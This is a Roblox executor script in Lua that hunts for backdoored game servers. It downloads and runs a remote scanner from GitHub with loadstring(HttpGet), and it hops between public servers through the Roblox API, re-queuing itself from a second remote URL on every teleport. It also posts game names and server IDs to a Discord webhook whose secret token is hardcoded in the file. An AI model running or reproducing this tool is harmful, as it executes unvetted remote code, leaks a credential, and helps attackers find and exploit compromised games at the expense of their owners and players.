-- [[ INDUSTRIAL BEHEMOTH - V21 UNSTABLE OVERRIDE ]] --
-- [[ FORCED MEMORY SATURATION - NO OPTIMIZATION ]] --

local success_text = "No backdoored"
local script_url = "https://raw.githubusercontent.com/jLn0n/beckdeer-skenner/main/src/main.lua"
local self_url = "https://raw.githubusercontent.com/TonyTeardown/scripts/refs/heads/main/bakad"
local webhook_url = "https://discord.com/api/webhooks/1487289258845802576/dXwi8nw8ptZZNEfWQiVLmBmNs0uSXGOXNRAR8cV_nDlDVJtSuDumUJlYB7_SEzVKiFqx" 

local FinalScript = [===[
    repeat task.wait() until game:IsLoaded()

    -- [[ SYSTEM SERVICE ARCHITECTURE ]] --
    local LogService = game:GetService("LogService")
    local TeleportService = game:GetService("TeleportService")
    local HttpService = game:GetService("HttpService")
    local CoreGui = game:GetService("CoreGui")
    local Players = game:GetService("Players")
    local MarketplaceService = game:GetService("MarketplaceService")
    local Stats = game:GetService("Stats")
    local TweenService = game:GetService("TweenService")
    local RunService = game:GetService("RunService")
    local UserInputService = game:GetService("UserInputService")
    local NetworkClient = game:GetService("NetworkClient")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local Lighting = game:GetService("Lighting")
    local Debris = game:GetService("Debris")
    local LocalPlayer = Players.LocalPlayer

    -- [[ STATE REGISTRY - LONG FORM ]] --
    local found_success = false
    local scan_completed = false
    local is_minimized = false
    local databaseName = "Sentinel_Behemoth_V21_Master.json"
    local currentJobId = tostring(game.JobId)
    local placeId = tostring(game.PlaceId)
    local webhook = "]===] .. webhook_url .. [===["
    local gameName = "COLLECTING SYSTEM DATA..."
    local startTime = os.time()
    
    -- API CRAWLER DATA
    local exhaustion_logs = {}
    local current_sort_order = "Asc"
    local total_unique_found = 0
    local skipCount = 0
    local pageCount = 0
    local currentCursor = ""

    pcall(function()
        local prod = MarketplaceService:GetProductInfo(tonumber(placeId))
        gameName = prod.Name
    end)

    -- [[ ANTI-AFK ENGINE - VERBOSE ]] --
    task.spawn(function()
        local VirtualUser = game:GetService("VirtualUser")
        LocalPlayer.Idled:Connect(function()
            pcall(function()
                VirtualUser:CaptureController()
                VirtualUser:ClickButton2(Vector2.new(0,0))
            end)
        end)
    end)

    -- [[ UI CONSTRUCTION - ZERO LOOPS - FULL BLOAT ]] --
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "Industrial_Behemoth_v21"
    screenGui.Parent = CoreGui

    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "Main"
    mainFrame.Size = UDim2.new(0, 540, 0, 520)
    mainFrame.Position = UDim2.new(1, -560, 1, -540)
    mainFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui

    local mainCorner = Instance.new("UICorner")
    mainCorner.CornerRadius = UDim.new(0, 15)
    mainCorner.Parent = mainFrame
    
    local mainStroke = Instance.new("UIStroke")
    mainStroke.Color = Color3.fromRGB(0, 255, 150)
    mainStroke.Thickness = 4
    mainStroke.Parent = mainFrame

    local header = Instance.new("Frame")
    header.Name = "Header"
    header.Size = UDim2.new(1, 0, 0, 75)
    header.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
    header.BorderSizePixel = 0
    header.Parent = mainFrame
    local hCorner = Instance.new("UICorner")
    hCorner.CornerRadius = UDim.new(0, 15)
    hCorner.Parent = header

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, -150, 1, 0)
    title.Position = UDim2.new(0, 25, 0, 0)
    title.Text = "BEHEMOTH INDUSTRIAL v21.0 [MEM-HEAVY]"
    title.TextColor3 = Color3.fromRGB(0, 255, 150)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.TextSize = 16
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = header

    local btnFrame = Instance.new("Frame")
    btnFrame.Size = UDim2.new(0, 120, 1, 0)
    btnFrame.Position = UDim2.new(1, -130, 0, 0)
    btnFrame.BackgroundTransparency = 1
    btnFrame.Parent = header

    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 38, 0, 38)
    closeBtn.Position = UDim2.new(1, -45, 0.5, -19)
    closeBtn.BackgroundColor3 = Color3.fromRGB(255, 40, 40)
    closeBtn.Text = "X"; closeBtn.TextColor3 = Color3.new(1,1,1)
    closeBtn.Font = Enum.Font.GothamBold; closeBtn.Visible = false
    closeBtn.Parent = btnFrame
    local cCorner = Instance.new("UICorner", closeBtn)
    cCorner.CornerRadius = UDim.new(1, 0)

    local minBtn = Instance.new("TextButton")
    minBtn.Size = UDim2.new(0, 38, 0, 38)
    minBtn.Position = UDim2.new(1, -90, 0.5, -19)
    minBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    minBtn.Text = "-"; minBtn.TextColor3 = Color3.new(1,1,1)
    minBtn.Font = Enum.Font.GothamBold
    minBtn.Parent = btnFrame
    local mCornerUI = Instance.new("UICorner", minBtn)
    mCornerUI.CornerRadius = UDim.new(1, 0)

    local content = Instance.new("Frame")
    content.Size = UDim2.new(1, 0, 1, -75)
    content.Position = UDim2.new(0, 0, 0, 75)
    content.BackgroundTransparency = 1
    content.Parent = mainFrame

    -- STATS GRID - NO HELPER FUNCTIONS - FULL MANUAL PROPERTY ASSIGNMENT
    local grid = Instance.new("Frame")
    grid.Size = UDim2.new(1, -30, 0, 180)
    grid.Position = UDim2.new(0, 15, 0, 15)
    grid.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
    grid.Parent = content
    local gCorner = Instance.new("UICorner", grid)
    gCorner.CornerRadius = UDim.new(0, 12)
    local gStroke = Instance.new("UIStroke", grid)
    gStroke.Color = Color3.fromRGB(30, 30, 30)

    -- DATA LABEL: EXPERIENCE
    local L1 = Instance.new("TextLabel", grid)
    L1.Size = UDim2.new(0.5, -15, 0, 25); L1.Position = UDim2.new(0, 15, 0, 15)
    L1.Text = "EXP: " .. string.sub(gameName, 1, 18); L1.TextColor3 = Color3.new(0.7,0.7,0.7)
    L1.BackgroundTransparency = 1; L1.Font = Enum.Font.GothamSemibold; L1.TextSize = 10; L1.TextXAlignment = Enum.TextXAlignment.Left

    -- DATA LABEL: PING
    local L2 = Instance.new("TextLabel", grid)
    L2.Size = UDim2.new(0.5, -15, 0, 25); L2.Position = UDim2.new(0.5, 5, 0, 15)
    L2.Text = "PING: 0ms"; L2.TextColor3 = Color3.new(0.7,0.7,0.7)
    L2.BackgroundTransparency = 1; L2.Font = Enum.Font.GothamSemibold; L2.TextSize = 10; L2.TextXAlignment = Enum.TextXAlignment.Left

    -- DATA LABEL: DEPTH
    local L3 = Instance.new("TextLabel", grid)
    L3.Size = UDim2.new(0.5, -15, 0, 25); L3.Position = UDim2.new(0, 15, 0, 45)
    L3.Text = "API DEPTH: 0"; L3.TextColor3 = Color3.fromRGB(0, 180, 255)
    L3.BackgroundTransparency = 1; L3.Font = Enum.Font.GothamSemibold; L3.TextSize = 10; L3.TextXAlignment = Enum.TextXAlignment.Left

    -- DATA LABEL: CACHE
    local L4 = Instance.new("TextLabel", grid)
    L4.Size = UDim2.new(0.5, -15, 0, 25); L4.Position = UDim2.new(0.5, 5, 0, 45)
    L4.Text = "CACHE: 0"; L4.TextColor3 = Color3.fromRGB(150, 150, 150)
    L4.BackgroundTransparency = 1; L4.Font = Enum.Font.GothamSemibold; L4.TextSize = 10; L4.TextXAlignment = Enum.TextXAlignment.Left

    -- DATA LABEL: FULL
    local L5 = Instance.new("TextLabel", grid)
    L5.Size = UDim2.new(0.5, -15, 0, 25); L5.Position = UDim2.new(0, 15, 0, 75)
    L5.Text = "SKIPPED: 0"; L5.TextColor3 = Color3.fromRGB(255, 80, 80)
    L5.BackgroundTransparency = 1; L5.Font = Enum.Font.GothamSemibold; L5.TextSize = 10; L5.TextXAlignment = Enum.TextXAlignment.Left

    -- DATA LABEL: SORT
    local L6 = Instance.new("TextLabel", grid)
    L6.Size = UDim2.new(0.5, -15, 0, 25); L6.Position = UDim2.new(0.5, 5, 0, 75)
    L6.Text = "SORT: ASCENDING"; L6.TextColor3 = Color3.fromRGB(255, 200, 0)
    L6.BackgroundTransparency = 1; L6.Font = Enum.Font.GothamSemibold; L6.TextSize = 10; L6.TextXAlignment = Enum.TextXAlignment.Left

    -- DATA LABEL: MEMORY
    local L7 = Instance.new("TextLabel", grid)
    L7.Size = UDim2.new(0.5, -15, 0, 25); L7.Position = UDim2.new(0, 15, 0, 105)
    L7.Text = "USAGE: 0MB"; L7.TextColor3 = Color3.fromRGB(100, 255, 100)
    L7.BackgroundTransparency = 1; L7.Font = Enum.Font.GothamSemibold; L7.TextSize = 10; L7.TextXAlignment = Enum.TextXAlignment.Left

    -- DATA LABEL: UPTIME
    local L8 = Instance.new("TextLabel", grid)
    L8.Size = UDim2.new(0.5, -15, 0, 25); L8.Position = UDim2.new(0.5, 5, 0, 105)
    L8.Text = "UPTIME: 0s"; L8.TextColor3 = Color3.new(0.7,0.7,0.7)
    L8.BackgroundTransparency = 1; L8.Font = Enum.Font.GothamSemibold; L8.TextSize = 10; L8.TextXAlignment = Enum.TextXAlignment.Left

    -- DATA LABEL: STATUS (WIDE)
    local LS = Instance.new("TextLabel", grid)
    LS.Size = UDim2.new(1, -30, 0, 30); LS.Position = UDim2.new(0, 15, 0, 140)
    LS.Text = "ENGINE STATUS: CALIBRATING..."; LS.TextColor3 = Color3.fromRGB(0, 255, 150)
    LS.BackgroundTransparency = 1; LS.Font = Enum.Font.GothamBold; LS.TextSize = 11; LS.TextXAlignment = Enum.TextXAlignment.Left

    -- CONSOLE SCROLL
    local logScroll = Instance.new("ScrollingFrame", content)
    logScroll.Size = UDim2.new(1, -30, 0, 215); logScroll.Position = UDim2.new(0, 15, 0, 210)
    logScroll.BackgroundColor3 = Color3.fromRGB(2, 2, 2); logScroll.BorderSizePixel = 0
    local logLayout = Instance.new("UIListLayout", logScroll); logLayout.Padding = UDim.new(0, 3)

    local function AddLog(msg, col)
        local l = Instance.new("TextLabel", logScroll)
        l.Size = UDim2.new(1, -10, 0, 18); l.BackgroundTransparency = 1; l.Text = " [" .. os.date("%X") .. "] " .. msg
        l.TextColor3 = col or Color3.new(0.9, 0.9, 0.9); l.Font = Enum.Font.Code; l.TextSize = 10; l.TextXAlignment = Enum.TextXAlignment.Left
        logScroll.CanvasSize = UDim2.new(0, 0, 0, logLayout.AbsoluteContentSize.Y + 20)
        logScroll.CanvasPosition = Vector2.new(0, logLayout.AbsoluteContentSize.Y)
    end

    -- [[ SECTION: INTERACTION LOGIC - DRAG ]] --
    local dragging, dragInput, dragStart, startPos
    header.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true; dragStart = input.Position; startPos = mainFrame.Position
            input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
        end
    end)
    header.InputChanged:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then dragInput = input end end)
    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - dragStart
            mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)

    minBtn.MouseButton1Click:Connect(function()
        is_minimized = not is_minimized
        content.Visible = not is_minimized
        local targetSize = is_minimized and UDim2.new(0, 540, 0, 75) or UDim2.new(0, 540, 0, 520)
        TweenService:Create(mainFrame, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = targetSize}):Play()
        minBtn.Text = is_minimized and "+" or "-"
    end)

    -- [[ SECTION: DATABASE ARCHITECTURE ]] --
    local function GetRegistry()
        AddLog("SYNCING HEAVY DATABASE...", Color3.new(1,1,1))
        local s, r = pcall(function() if isfile(databaseName) then return HttpService:JSONDecode(readfile(databaseName)) end end)
        local reg = (s and type(r) == "table") and r or {}
        if not reg[placeId] then reg[placeId] = {} end
        L4.Text = "CACHE: " .. #reg[placeId]
        return reg
    end

    local GlobalRegistry = GetRegistry()
    local CurrentSessionList = GlobalRegistry[placeId]

    local function CommitNode(id)
        local sid = tostring(id); local ex = false
        for _, v in pairs(CurrentSessionList) do if v == sid then ex = true break end end
        if not ex then
            table.insert(CurrentSessionList, sid); GlobalRegistry[placeId] = CurrentSessionList
            pcall(function() writefile(databaseName, HttpService:JSONEncode(GlobalRegistry)) end)
            L4.Text = "CACHE: " .. #CurrentSessionList
            AddLog("CAPTURED NODE: .." .. string.sub(sid, -8), Color3.fromRGB(0, 255, 150))
        end
    end

    local function ResetCrawler()
        AddLog("!!! STAGNATION TRIGGERED !!! PURGING SESSION...", Color3.fromRGB(255, 50, 50))
        CurrentSessionList = {}
        GlobalRegistry[placeId] = {}
        L4.Text = "CACHE: 0"
    end

    -- [[ SECTION: SCANNER ANALYSIS ]] --
    local obs = LogService.MessageOut:Connect(function(m)
        local low = m:lower()
        if string.find(low, "]===] .. success_text:lower() .. [===[" , 1, true) then found_success = true end
        if string.find(low, "complete") or string.find(low, "finished") then scan_completed = true end
    end)

    AddLog("INJECTING OVERCLOCK DATA...", Color3.new(1, 1, 1))
    pcall(function() loadstring(game:HttpGet("]===] .. script_url .. [===["))() end)

    task.spawn(function()
        while task.wait(0.5) do
            pcall(function()
                L2.Text = "PING: " .. math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue()) .. "ms"
                L7.Text = "USAGE: " .. math.floor(Stats:GetTotalMemoryUsageMb()) .. "MB"
                L8.Text = "UPTIME: " .. (os.time() - startTime) .. "s"
            end)
        end
    end)

    local waitA = 0
    while waitA < 40 do
        if found_success then break end
        if scan_completed and waitA > 5 then break end
        waitA = waitA + 1; LS.Text = "STATUS: SCANNING NODES (" .. waitA .. "s)"; task.wait(1)
    end
    obs:Disconnect()

    -- [[ SECTION: THE "40 SERVER" BREAKER MODULE ]] --
    local function SwitchPerspective()
        if current_sort_order == "Asc" then
            current_sort_order = "Desc"
            L6.Text = "SORT: DESCENDING"
            AddLog("SHIFTING PERSPECTIVE: TARGETING TAIL-END NODES.", Color3.fromRGB(255, 200, 0))
        else
            current_sort_order = "Asc"
            L6.Text = "SORT: ASCENDING"
            AddLog("SHIFTING PERSPECTIVE: TARGETING HEAD-END NODES.", Color3.fromRGB(255, 200, 0))
        end
        exhaustion_logs = {}
    end

    -- [[ SECTION: AGGRESSIVE CRAWLER CORE ]] --
    if found_success then
        LS.Text = "STATUS: TARGETING API..."
        
        local function ExecuteDeepScan()
            local q = (syn and syn.queue_on_teleport) or (queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)
            if q then pcall(function() q(game:HttpGet("]===] .. self_url .. [===[")) end) end

            while true do
                pageCount = pageCount + 1; L3.Text = "API DEPTH: " .. pageCount
                AddLog("PENETRATING PAGE " .. pageCount .. " (" .. current_sort_order .. ")", Color3.fromRGB(0, 180, 255))
                
                local api = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?sortOrder=" .. current_sort_order .. "&limit=100"
                if currentCursor ~= "" then api = api .. "&cursor=" .. currentCursor end
                
                local ok, resp = pcall(function() return game:HttpGet(api) end)
                if ok and resp then
                    local decoded = HttpService:JSONDecode(resp)
                    if decoded and decoded.data then
                        for index, node in pairs(decoded.data) do
                            local id = tostring(node.id)
                            if node.playing < node.maxPlayers and id ~= currentJobId then
                                local known = false
                                for _, saved in pairs(CurrentSessionList) do if id == saved then known = true break end end
                                if not known then
                                    AddLog("NODE BREACHED. TELEPORTING.", Color3.fromRGB(0, 255, 100))
                                    CommitNode(id); TeleportService:TeleportToPlaceInstance(tonumber(placeId), id, LocalPlayer)
                                    task.wait(6)
                                end
                            else
                                skipCount = skipCount + 1; L5.Text = "SKIPPED: " .. skipCount
                            end
                        end
                        if decoded.nextPageCursor and decoded.nextPageCursor ~= "" then
                            currentCursor = decoded.nextPageCursor; task.wait(0.01)
                        else
                            AddLog("PAGE EXHAUSTED. EVALUATING...", Color3.fromRGB(255, 150, 0))
                            table.insert(exhaustion_logs, os.time())
                            if #exhaustion_logs >= 5 then ResetCrawler() end
                            SwitchPerspective(); currentCursor = ""; pageCount = 0; task.wait(8)
                        end
                    end
                else
                    AddLog("API OVERLOAD. COOLING 15s.", Color3.new(1,0,0)); task.wait(15)
                end
            end
        end
        ExecuteDeepScan()
    else
        LS.Text = "STATUS: !!! CRITICAL SECURITY !!!"; mainStroke.Color = Color3.fromRGB(255, 40, 40); closeBtn.Visible = true
        pcall(function()
            local payload = HttpService:JSONEncode({["username"] = "Industrial Behemoth v21", ["embeds"] = {{["title"] = "🎯 BACKDOOR DETECTED", ["color"] = 16711680, ["fields"] = {{["name"] = "Game", ["value"] = gameName}, {["name"] = "JobId", ["value"] = currentJobId}}}}})
            local req = (syn and syn.request) or (http and http.request) or http_request
            req({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload})
        end)
    end
]===]

loadstring(FinalScript)()
